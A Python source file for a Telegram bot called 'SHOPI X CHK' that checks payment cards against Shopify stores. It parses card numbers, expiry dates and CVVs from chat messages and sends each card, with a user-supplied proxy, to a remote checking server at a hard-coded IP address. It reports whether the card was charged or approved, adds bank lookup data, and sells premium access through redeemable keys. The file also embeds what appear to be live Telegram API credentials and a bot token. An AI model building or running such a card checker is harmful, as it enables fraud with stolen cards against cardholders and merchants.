from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse


# Config
API_ID = 29954197
API_HASH = "4ea7a4f028bed2a8077c65085dddc9c4"
BOT_TOKEN = "8716628980:AAGwVTvtt3Rf-3HpwVGT0eFsydpZYFyxRew" # Replace with your Bot Token
ADMIN_ID = [8743278247, 8340881349] # Replace with your Admin ID(s)
GROUP_ID = -1003872018247 # Replace with your Group ID

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"
SITE_FILE = "site.txt"

# --- Utility Functions ---

async def create_file_if_not_exists(filename, default_content=""):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(default_content)
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE]:
        await create_file_if_not_exists(file, json.dumps({}))
    await create_file_if_not_exists(SITE_FILE, "")

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_file_if_not_exists(filename, json.dumps({}))
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

async def load_sites():
    try:
        if not os.path.exists(SITE_FILE): return []
        async with aiofiles.open(SITE_FILE, "r") as f:
            content = await f.read()
            return [line.strip() for line in content.splitlines() if line.strip()]
    except Exception as e:
        print(f"Error loading sites: {e}")
        return []

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    if datetime.datetime.now() > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def get_remaining_time(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return "0𝗱 0𝗵"
    expiry = datetime.datetime.fromisoformat(user_data['expiry'])
    delta = expiry - datetime.datetime.now()
    if delta.total_seconds() <= 0: return "𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
    days = delta.days
    hours = delta.seconds // 3600
    return f"{days}𝗱 {hours}𝗵"

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {'expiry': expiry_date.isoformat(), 'added_by': 'admin'}
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {'banned_at': datetime.datetime.now().isoformat(), 'banned_by': banned_by}
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_num}") as res:
                if res.status != 200: return "𝗨𝗻𝗸𝗻𝗼𝘄𝗻", "-", "-", "-", "-", "🏳️"
                data = await res.json()
                return data.get('brand','-'), data.get('type','-'), data.get('level','-'), data.get('bank','-'), data.get('country_name','-'), data.get('country_flag','🏳️')
    except: return "-", "-", "-", "-", "-", "🏳️"

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                return res.status == 200
    except: return False

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    if '://' in proxy:
        proxy_type, proxy = proxy.split('://', 1)
    
    host = port = user = pw = ''
    if '@' in proxy:
        auth, addr = proxy.split('@')
        user, pw = auth.split(':')
        host, port = addr.split(':')
    else:
        parts = proxy.split(':')
        if len(parts) == 4: host, port, user, pw = parts
        elif len(parts) == 2: host, port = parts
        else: return None
    
    proxy_url = f"{proxy_type}://{user}:{pw}@{host}:{port}" if user else f"{proxy_type}://{host}:{port}"
    return {'ip': host, 'port': port, 'user': user or None, 'pw': pw or None, 'proxy_url': proxy_url, 'type': proxy_type}

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(user_id), [])
    return random.choice(user_proxies) if user_proxies else None

async def check_card_api(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id)
    if not proxy_data: return {"Response": "𝗣𝗥𝗢𝗫𝗬_𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗"}
    
    try:
        proxy_str = f"{proxy_data['ip']}:{proxy_data['port']}"
        if proxy_data['user']: proxy_str += f":{proxy_data['user']}:{proxy_data['pw']}"
        
        url = f'http://198.105.113.52:5000/?{card}&url={site}&proxy={proxy_str}'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=100)) as session:
            async with session.get(url) as res:
                if res.status != 200: return {"Response": f"𝗛𝗧𝗧𝗣_𝗘𝗥𝗥𝗢𝗥_{res.status}"}
                data = await res.json()
                charged = str(data.get('Charged', 'False')).lower() == 'true'
                approved = str(data.get('Approved', 'False')).lower() == 'true'
                return {
                    "Response": data.get('Response', ''),
                    "Price": data.get('Price', '-'),
                    "Gateway": data.get('Gate', 'Shopify'),
                    "Status": "𝗖𝗵𝗮𝗿𝗴𝗲𝗱" if charged else ("𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" if approved else "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱"),
                    "Site": site
                }
    except Exception as e: return {"Response": str(e)}

client = TelegramClient('cc_bot', API_ID, API_HASH)

# --- UI Components ---

def get_main_menu():
    return [
        [Button.inline("💳 𝗖𝗵𝗲𝗰𝗸 𝗖𝗖", data="menu_check"), Button.inline("📡 𝗦𝗲𝘁 𝗣𝗿𝗼𝘅𝘆", data="menu_proxy")],
        [Button.inline("👤 𝗠𝘆 𝗣𝗿𝗼𝗳𝗶𝗹𝗲", data="menu_profile")]
    ]

def get_back_button():
    return [Button.inline("⬅️ 𝗕𝗮𝗰𝗸", data="main_menu")]

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start)$'))
async def start(event):
    text = """⚡ **𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝗛𝗢𝗣𝗜 𝗫 𝗖𝗛𝗞**

⚡ **𝗛𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗴𝗮𝘁𝗲𝘄𝗮𝘆 𝗰𝗵𝗲𝗰𝗸𝗲𝗿**
⚡ **𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝘀 𝗮𝗹𝗹 𝗽𝗿𝗼𝘅𝘆 𝗳𝗼𝗿𝗺𝗮𝘁𝘀**
⚡ **𝗠𝘂𝗹𝘁𝗶-𝘀𝗶𝘁𝗲 𝗿𝗼𝘁𝗮𝘁𝗶𝗼𝗻 𝘄𝗶𝘁𝗵 𝗿𝗲𝘁𝗿𝘆 𝗹𝗼𝗴𝗶𝗰**

⚡ **𝗨𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝘀𝘁𝗮𝗿𝘁𝗲𝗱:**"""
    await event.reply(text, buttons=get_main_menu())

@client.on(events.CallbackQuery(data="main_menu"))
async def main_menu_callback(event):
    text = """⚡ **𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗦𝗛𝗢𝗣𝗜 𝗫 𝗖𝗛𝗞**

⚡ **𝗛𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗴𝗮𝘁𝗲𝘄𝗮𝘆 𝗰𝗵𝗲𝗰𝗸𝗲𝗿**
⚡ **𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝘀 𝗮𝗹𝗹 𝗽𝗿𝗼𝘅𝘆 𝗳𝗼𝗿𝗺𝗮𝘁𝘀**
⚡ **𝗠𝘂𝗹𝘁𝗶-𝘀𝗶𝘁𝗲 𝗿𝗼𝘁𝗮𝘁𝗶𝗼𝗻 𝘄𝗶𝘁𝗵 𝗿𝗲𝘁𝗿𝘆 𝗹𝗼𝗴𝗶𝗰**

⚡ **𝗨𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗴𝗲𝘁 𝘀𝘁𝗮𝗿𝘁𝗲𝗱:**"""
    await event.edit(text, buttons=get_main_menu())

@client.on(events.CallbackQuery(data="menu_check"))
async def menu_check_callback(event):
    text = """⚡ **𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿**

⚡ **𝗨𝘀𝗮𝗴𝗲:**
⚡ `/sh cc|mm|yy|cvv`
⚡ `/msh cc|mm|yy|cvv` (𝗠𝗮𝘅 20)
⚡ `/ran` (𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝘁𝘅𝘁 𝗳𝗶𝗹𝗲)
⚡ **𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝗶𝗻𝗴 𝗮 𝗖𝗖**

⚡ **𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮 𝗽𝗿𝗼𝘅𝘆 𝘀𝗲𝘁 𝗯𝗲𝗳𝗼𝗿𝗲 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴!**"""
    await event.edit(text, buttons=get_back_button())

@client.on(events.CallbackQuery(data="menu_proxy"))
async def menu_proxy_callback(event):
    text = """⚡ **𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿**

⚡ `/addpxy host:port:user:pass`
⚡ `/addpxy socks5://user:pass@host:port`
⚡ `/proxy` — **𝗩𝗶𝗲𝘄 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗽𝗿𝗼𝘅𝘆**
⚡ `/rmpxy [index]` — **𝗥𝗲𝗺𝗼𝘃𝗲 𝗽𝗿𝗼𝘅𝘆**

⚡ **𝗣𝗿𝗼𝘅𝘆 𝗶𝘀 𝘁𝗲𝘀𝘁𝗲𝗱 𝗯𝗲𝗳𝗼𝗿𝗲 𝘀𝗮𝘃𝗶𝗻𝗴.**"""
    await event.edit(text, buttons=get_back_button())

@client.on(events.CallbackQuery(data="menu_profile"))
async def menu_profile_callback(event):
    user_id = event.sender_id
    sender = await event.get_sender()
    name = sender.first_name
    username = f"@{sender.username}" if sender.username else "𝗡/𝗔"
    
    is_premium = await is_premium_user(user_id)
    plan = f"⚡ **𝗣𝗿𝗲𝗺𝗶𝘂𝗺** ({await get_remaining_time(user_id)})" if is_premium else "⚡ **𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿**"
    
    proxies = await load_json(PROXY_FILE)
    proxy_count = len(proxies.get(str(user_id), []))
    
    text = f"""⚡ **𝗨𝘀𝗲𝗿 𝗣𝗿𝗼𝗳𝗶𝗹𝗲**

⚡ **𝗡𝗮𝗺𝗲:** {name}
⚡ **𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲:** {username}
⚡ **𝗜𝗗:** `{user_id}`

⚡ **𝗣𝗹𝗮𝗻:** {plan}
⚡ **𝗣𝗿𝗼𝘅𝘆:** ⚡ **{proxy_count} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀**

⚡ **𝗖𝗖 𝗟𝗶𝗺𝗶𝘁 (/𝗿𝗮𝗻):** 100"""
    await event.edit(text, buttons=get_back_button())

# --- Functionality ---

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy_cmd(event):
    proxy_text = event.raw_text.replace('/addpxy', '').strip()
    if not proxy_text: return await event.reply("⚡ **𝗙𝗼𝗿𝗺𝗮𝘁:** `/addpxy host:port:user:pw`")
    
    proxy_data = parse_proxy_format(proxy_text)
    if not proxy_data: return await event.reply("⚡ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁!**")
    
    loading = await event.reply("⚡ **𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝘅𝘆...**")
    if not await test_proxy(proxy_data['proxy_url']):
        return await loading.edit("⚡ **𝗣𝗿𝗼𝘅𝘆 𝗳𝗮𝗶𝗹𝗲𝗱 𝘁𝗲𝘀𝘁! 𝗡𝗼𝘁 𝘀𝗮𝘃𝗲𝗱.**")
    
    proxies = await load_json(PROXY_FILE)
    uid = str(event.sender_id)
    if uid not in proxies: proxies[uid] = []
    if len(proxies[uid]) >= 30: return await loading.edit("⚡ **𝗠𝗮𝘅 30 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗮𝗹𝗹𝗼𝘄𝗲𝗱!**")
    
    proxies[uid].append(proxy_data)
    await save_json(PROXY_FILE, proxies)
    await loading.edit(f"⚡ **𝗣𝗿𝗼𝘅𝘆 𝘀𝗮𝘃𝗲𝗱!** ({len(proxies[uid])}/30)")

@client.on(events.NewMessage(pattern='/proxy'))
async def list_proxy_cmd(event):
    proxies = await load_json(PROXY_FILE)
    user_proxies = proxies.get(str(event.sender_id), [])
    if not user_proxies: return await event.reply("⚡ **𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱!**")
    
    msg = "⚡ **𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗣𝗿𝗼𝘅𝗶𝗲𝘀:**\n\n"
    for i, p in enumerate(user_proxies, 1):
        msg += f"{i}. `{p['ip']}:{p['port']}`\n"
    await event.reply(msg)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply("🚫 **𝗕𝗮𝗻𝗻𝗲𝗱!**")
    if not can_access: return await event.reply("🚫 **𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱!**")
    
    card = extract_card(event.raw_text)
    if not card and event.reply_to_msg_id:
        replied = await event.get_reply_message()
        card = extract_card(replied.text) if replied.text else None
    
    if not card: return await event.reply("⚡ **𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗖𝗖!**")
    
    sites = await load_sites()
    if not sites: return await event.reply("⚡ **𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗶𝗻 𝗗𝗕!**")
    site = random.choice(sites)
    
    loading = await event.reply(f"⚪ **𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗖𝗖...**\n\n⭐ **𝗖𝗖:** `{card}`\n🪐 **𝗦𝗶𝘁𝗲:** `{site}`\n⌛ **𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...**")
    
    res = await check_card_api(card, site, event.sender_id)
    if res.get('Response') == "𝗣𝗥𝗢𝗫𝗬_𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗":
        return await loading.edit("⚡ **𝗦𝗲𝘁 𝗮 𝗽𝗿𝗼𝘅𝘆 𝗳𝗶𝗿𝘀𝘁!**")
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
    status = res.get('Status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
    header = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎" if status == "𝗖𝗵𝗮𝗿𝗴𝗲𝗱" else ("𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" if status == "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" else "~~ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ~~ ❌")
    
    msg = f"""{header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {res.get('Gateway', 'Shopify')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ `{site}`

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"""
    await loading.edit(msg)

# --- Admin ---

@client.on(events.NewMessage(pattern='/key'))
async def admin_key_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        count = int(parts[1]) if len(parts) > 1 else 1
        days = int(parts[2]) if len(parts) > 2 else 30
        
        keys = await load_json(KEYS_FILE)
        new_keys = []
        for _ in range(count):
            k = generate_key()
            keys[k] = days
            new_keys.append(k)
        
        await save_json(KEYS_FILE, keys)
        msg = f"⚡ **𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 {count} 𝗸𝗲𝘆𝘀 ({days} 𝗱𝗮𝘆𝘀):**\n\n"
        for k in new_keys: msg += f"`{k}`\n"
        await event.reply(msg)
    except: await event.reply("⚡ **𝗙𝗼𝗿𝗺𝗮𝘁:** `/key [count] [days]`")

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_cmd(event):
    key = event.raw_text.replace('/redeem', '').strip()
    keys = await load_json(KEYS_FILE)
    if key in keys:
        days = keys.pop(key)
        await save_json(KEYS_FILE, keys)
        await add_premium_user(event.sender_id, days)
        await event.reply(f"⚡ **𝗦𝘂𝗰𝗰𝗲𝘀𝘀! {days} 𝗱𝗮𝘆𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻.**")
    else: await event.reply("⚡ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆!**")

@client.on(events.NewMessage(pattern='/auth'))
async def admin_auth_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        parts = event.raw_text.split()
        uid = int(parts[1])
        days = int(parts[2])
        await add_premium_user(uid, days)
        await event.reply(f"⚡ **𝗨𝘀𝗲𝗿 {uid} 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗳𝗼𝗿 {days} 𝗱𝗮𝘆𝘀!**")
    except: await event.reply("⚡ **𝗙𝗼𝗿𝗺𝗮𝘁:** `/auth [id] [days]`")

async def main():
    await initialize_files()
    print("SHOPI X CHK RUNNING 💨")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
